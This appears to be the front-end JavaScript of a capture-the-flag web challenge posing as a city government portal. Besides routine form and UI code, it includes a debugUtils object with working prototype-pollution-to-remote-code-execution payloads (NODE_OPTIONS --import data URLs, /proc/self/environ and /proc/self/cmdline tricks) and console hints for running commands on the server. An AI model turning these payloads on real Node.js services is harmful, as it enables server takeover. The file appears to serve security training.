// Utopia City Government Portal - Main JavaScript

document.addEventListener('DOMContentLoaded', function () {
    console.log('Utopia City Government Portal loaded');

    // Contact form handling
    const contactForm = document.getElementById('contactForm');
    if (contactForm) {
        contactForm.addEventListener('submit', handleContactForm);
    }

    // Admin login form handling
    const adminLoginForm = document.getElementById('adminLoginForm');
    if (adminLoginForm) {
        adminLoginForm.addEventListener('submit', handleAdminLogin);
    }

    // System info button
    const systemInfoBtn = document.getElementById('systemInfoBtn');
    if (systemInfoBtn) {
        systemInfoBtn.addEventListener('click', getSystemInfo);
    }

    // Add some interactive elements
    addInteractiveElements();
});

async function handleContactForm(event) {
    event.preventDefault();

    const form = event.target;
    const formData = new FormData(form);

    // Create the payload with config object for prototype pollution
    const payload = {
        name: formData.get('name'),
        email: formData.get('email'),
        message: formData.get('message'),
        department: formData.get('department'),
        config: {
            department: formData.get('department'),
            priority: formData.get('priority') || 'normal'
        }
    };

    try {
        showLoading('Submitting your message...');

        const response = await fetch('/api/contact', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload)
        });

        const result = await response.json();

        hideLoading();

        if (result.success) {
            showAlert('success', `Thank you! Your message has been submitted. Ticket: ${result.ticket}`);
            form.reset();
        } else {
            showAlert('error', result.message || 'Failed to submit message');
        }
    } catch (error) {
        hideLoading();
        showAlert('error', 'Network error. Please try again.');
        console.error('Contact form error:', error);
    }
}

async function handleAdminLogin(event) {
    event.preventDefault();

    const form = event.target;
    const formData = new FormData(form);

    const payload = {
        username: formData.get('username'),
        password: formData.get('password')
    };

    try {
        showLoading('Authenticating...');

        const response = await fetch('/api/admin/login', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload)
        });

        const result = await response.json();

        hideLoading();

        if (result.success) {
            showAlert('success', 'Login successful! Redirecting...');
            setTimeout(() => {
                window.location.href = result.redirect || '/admin';
            }, 1000);
        } else {
            showAlert('error', result.message || 'Login failed');
        }
    } catch (error) {
        hideLoading();
        showAlert('error', 'Network error. Please try again.');
        console.error('Admin login error:', error);
    }
}

async function getSystemInfo() {
    try {
        showLoading('Fetching system information...');

        const response = await fetch('/api/admin/system');
        const result = await response.json();

        hideLoading();

        if (response.ok) {
            const systemInfoDiv = document.getElementById('systemInfo');
            systemInfoDiv.innerHTML = `
                <div class="alert alert-success">
                    <h4>System Information</h4>
                    <pre>${result.system}</pre>
                    ${result.flag ? `<p><strong>Flag:</strong> ${result.flag}</p>` : ''}
                </div>
            `;
        } else {
            showAlert('error', result.error || 'Failed to fetch system info');
        }
    } catch (error) {
        hideLoading();
        showAlert('error', 'Network error. Please try again.');
        console.error('System info error:', error);
    }
}

function showAlert(type, message) {
    const alertDiv = document.createElement('div');
    alertDiv.className = `alert alert-${type}`;
    alertDiv.textContent = message;

    // Remove existing alerts
    const existingAlerts = document.querySelectorAll('.alert');
    existingAlerts.forEach(alert => alert.remove());

    // Add new alert
    const main = document.querySelector('.main .container');
    main.insertBefore(alertDiv, main.firstChild);

    // Auto-remove after 5 seconds
    setTimeout(() => {
        alertDiv.remove();
    }, 5000);
}

function showLoading(message = 'Loading...') {
    const loadingDiv = document.createElement('div');
    loadingDiv.id = 'loadingOverlay';
    loadingDiv.innerHTML = `
        <div style="
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.5);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 9999;
            color: white;
            font-size: 1.2rem;
        ">
            <div style="text-align: center;">
                <div class="loading"></div>
                <div style="margin-top: 1rem;">${message}</div>
            </div>
        </div>
    `;
    document.body.appendChild(loadingDiv);
}

function hideLoading() {
    const loadingDiv = document.getElementById('loadingOverlay');
    if (loadingDiv) {
        loadingDiv.remove();
    }
}

function addInteractiveElements() {
    // Add hover effects to cards
    const cards = document.querySelectorAll('.card');
    cards.forEach(card => {
        card.addEventListener('mouseenter', function () {
            this.style.transform = 'translateY(-5px)';
        });

        card.addEventListener('mouseleave', function () {
            this.style.transform = 'translateY(0)';
        });
    });

    // Add click effect to buttons
    const buttons = document.querySelectorAll('.btn');
    buttons.forEach(button => {
        button.addEventListener('click', function () {
            this.style.transform = 'scale(0.95)';
            setTimeout(() => {
                this.style.transform = 'scale(1)';
            }, 150);
        });
    });
}

// Utility functions for CTF
window.debugUtils = {
    // Helper function to create NODE_OPTIONS based PP2RCE payload
    createPP2RCEPayload: function (command) {
        // Method 1: Using NODE_OPTIONS with --import for modern Node.js (19+)
        const jsPayload = `require('child_process').execSync('${command}')`;
        const base64Payload = Buffer.from(jsPayload).toString('base64');

        return {
            name: "Security Researcher",
            email: "researcher@security.com",
            message: "Testing PP2RCE vulnerability",
            config: {
                "__proto__": {
                    "NODE_OPTIONS": `--import data:text/javascript;base64,${base64Payload}`
                }
            }
        };
    },

    // Alternative payload using env vars
    createEnvPP2RCEPayload: function (command) {
        return {
            name: "Security Researcher",
            email: "researcher@security.com",
            message: "Testing PP2RCE via env vars",
            config: {
                "__proto__": {
                    "env": {
                        "EVIL": `console.log(require('child_process').execSync('${command}').toString())//`
                    },
                    "NODE_OPTIONS": "--require /proc/self/environ"
                }
            }
        };
    },

    // Alternative payload using cmdline
    createCmdlinePP2RCEPayload: function (command) {
        return {
            name: "Security Researcher",
            email: "researcher@security.com",
            message: "Testing PP2RCE via cmdline",
            config: {
                "__proto__": {
                    "argv0": `console.log(require('child_process').execSync('${command}').toString())//`,
                    "NODE_OPTIONS": "--require /proc/self/cmdline"
                }
            }
        };
    },

    // Helper function to test prototype pollution
    testPP2RCE: async function (command, method = 'import') {
        let payload;

        switch (method) {
            case 'import':
                payload = this.createPP2RCEPayload(command);
                break;
            case 'env':
                payload = this.createEnvPP2RCEPayload(command);
                break;
            case 'cmdline':
                payload = this.createCmdlinePP2RCEPayload(command);
                break;
            default:
                payload = this.createPP2RCEPayload(command);
        }

        try {
            console.log('Sending PP2RCE payload:', JSON.stringify(payload, null, 2));

            const response = await fetch('/api/contact', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(payload)
            });

            const result = await response.json();
            console.log('PP2RCE test result:', result);

            // Test if pollution worked
            if (process.env.NODE_ENV !== 'production') {
                setTimeout(async () => {
                    try {
                        const pollutionTest = await fetch('/api/debug/test-pollution', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' }
                        });
                        const pollutionResult = await pollutionTest.json();
                        console.log('Pollution check:', pollutionResult);
                    } catch (e) {
                        console.log('Pollution check failed (endpoint may not exist in production)');
                    }
                }, 500);
            }

            return result;
        } catch (error) {
            console.error('PP2RCE test error:', error);
            return null;
        }
    },

    // Test basic prototype pollution without RCE
    testBasicPollution: async function () {
        const payload = {
            name: "Test User",
            email: "test@example.com",
            message: "Testing basic prototype pollution",
            config: {
                "__proto__": {
                    "polluted": true,
                    "testValue": "This proves prototype pollution works"
                }
            }
        };

        try {
            const response = await fetch('/api/contact', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(payload)
            });

            const result = await response.json();

            // Check if pollution worked
            const testObj = {};
            console.log('Basic pollution test:');
            console.log('testObj.polluted:', testObj.polluted);
            console.log('testObj.testValue:', testObj.testValue);
            console.log('({}).polluted:', ({}).polluted);

            return result;
        } catch (error) {
            console.error('Basic pollution test error:', error);
            return null;
        }
    }
};

// Development helper (remove in production)
if (window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1') {
    console.log('🔧 Development mode detected');
    console.log('💡 Hint: Check the /api/contact endpoint for prototype pollution vulnerabilities');
    console.log('🎯 Try using these commands in the console:');
    console.log('   debugUtils.testBasicPollution() - Test basic prototype pollution');
    console.log('   debugUtils.testPP2RCE("whoami") - Test PP2RCE with whoami command');
    console.log('   debugUtils.testPP2RCE("echo $FLAG", "import") - Get flag using --import method');
    console.log('   debugUtils.testPP2RCE("echo $FLAG", "env") - Get flag using env method');
    console.log('   debugUtils.testPP2RCE("echo $FLAG", "cmdline") - Get flag using cmdline method');
    console.log('');
    console.log('🔍 PP2RCE Methods available:');
    console.log('   - "import": NODE_OPTIONS with --import (Node 19+, filesystem-less)');
    console.log('   - "env": NODE_OPTIONS with --require /proc/self/environ');
    console.log('   - "cmdline": NODE_OPTIONS with --require /proc/self/cmdline');
}
